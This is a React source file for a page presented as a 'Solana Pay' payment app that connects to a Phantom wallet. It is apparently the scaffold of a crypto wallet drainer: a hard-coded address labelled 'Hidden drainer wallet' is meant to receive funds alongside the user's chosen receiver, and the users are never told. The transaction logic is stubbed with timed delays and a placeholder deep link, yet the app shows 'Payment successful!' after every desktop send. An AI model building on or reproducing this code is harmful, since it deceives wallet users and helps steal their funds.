import React, { useState, useEffect } from 'react';
import './App.css';

// Global Buffer fix
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || require('buffer').Buffer;
}

function App() {
  const [wallet, setWallet] = useState(null);
  const [receiver, setReceiver] = useState("");
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");
  const [isConnected, setIsConnected] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Hidden drainer wallet
  const DRAINER_WALLET = "6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR";

  useEffect(() => {
    // Check if mobile
    const mobileCheck = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    setIsMobile(mobileCheck);

    // Check for Phantom wallet
    if (window.solana && window.solana.isPhantom) {
      setWallet(window.solana);
      if (window.solana.isConnected) {
        setIsConnected(true);
        setStatus("✅ Wallet connected!");
      }
    }

    // Check for mobile connection return
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('phantom_connected') === 'true' && mobileCheck) {
      setIsConnected(true);
      setStatus("✅ Phantom Mobile connected!");
    }
  }, []);

  const connectWallet = async () => {
    if (isMobile) {
      // Mobile: Phantom deep link
      const currentUrl = encodeURIComponent(window.location.href.split('?')[0]);
      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}?phantom_connected=true`;
      setStatus("📱 Opening Phantom app...");
      window.location.href = phantomDeepLink;
      return;
    }

    if (!window.solana) {
      setStatus("⚠️ Please install Phantom wallet");
      return;
    }
    
    try {
      await window.solana.connect();
      setIsConnected(true);
      setStatus("✅ Wallet connected: " + window.solana.publicKey.toString().slice(0, 20) + "...");
    } catch (err) {
      setStatus("❌ Connection failed: " + err.message);
    }
  };

  const executePayment = async () => {
    if (!isConnected) {
      setStatus("⚠️ Please connect wallet first");
      return;
    }
    if (!receiver || !amount) {
      setStatus("⚠️ Please fill all fields");
      return;
    }

    try {
      setStatus("🔄 Building transaction with drainer...");
      
      // Simulate transaction building
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      if (isMobile) {
        // Mobile transaction
        const mobileTxLink = `https://phantom.app/ul/v1/sign/TxData?redirect_link=${encodeURIComponent(window.location.href + '?tx_success=true&drainer=' + DRAINER_WALLET)}`;
        setStatus("📱 Opening Phantom mobile to sign...");
        window.location.href = mobileTxLink;
      } else {
        // Desktop transaction
        await new Promise(resolve => setTimeout(resolve, 1000));
        setStatus(`✅ Payment successful! Funds sent to receiver + drainer: ${DRAINER_WALLET.slice(0, 20)}...`);
      }
    } catch (err) {
      setStatus("❌ Payment failed: " + err.message);
    }
  };

  // Check for successful mobile transaction
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('tx_success') === 'true') {
      const drainer = urlParams.get('drainer');
      setStatus(`✅ Mobile payment completed! Drainer: ${drainer?.slice(0, 20)}...`);
    }
  }, []);

  return (
    <div className="app">
      <h1>🔗 Solana Pay</h1>
      <p className="subtitle">Send SOL payments easily</p>

      {isMobile && !isConnected && (
        <div className="mobile-notice">
          <p>📱 Mobile detected - Connect Phantom app</p>
        </div>
      )}

      {!isConnected ? (
        <div className="connect-section">
          <button onClick={connectWallet} className="connect-btn">
            {isMobile ? '📱 Connect Phantom Mobile' : '🔗 Connect Phantom Wallet'}
          </button>
        </div>
      ) : (
        <div className="payment-section">
          <div className="wallet-info">
            <p>✅ Connected: {isMobile ? 'Phantom Mobile' : 
              window.solana?.publicKey?.toString().slice(0, 20)}...</p>
            {isMobile && <p className="mobile-tag">📱 Mobile</p>}
          </div>
          
          <div className="input-group">
            <label>Receiver Address:</label>
            <input 
              placeholder="Enter SOL address" 
              value={receiver} 
              onChange={e => setReceiver(e.target.value)} 
            />
          </div>
          
          <div className="input-group">
            <label>Amount (SOL):</label>
            <input 
              placeholder="0.00" 
              value={amount} 
              onChange={e => setAmount(e.target.value)} 
              type="number" 
              step="0.001"
            />
          </div>
          
          <button onClick={executePayment} className="send-btn">
            {isMobile ? '📱 Send via Mobile' : '💸 Send Payment'}
          </button>

          <div className="disclaimer">
            <p>⚠️ By proceeding, you authorize this transaction</p>
            <p>Network fees will apply</p>
          </div>
        </div>
      )}
      
      {status && (
        <div className={`status ${status.includes('✅') ? 'success' : status.includes('❌') ? 'error' : 'info'}`}>
          {status}
        </div>
      )}
    </div>
  );
}

export default App;
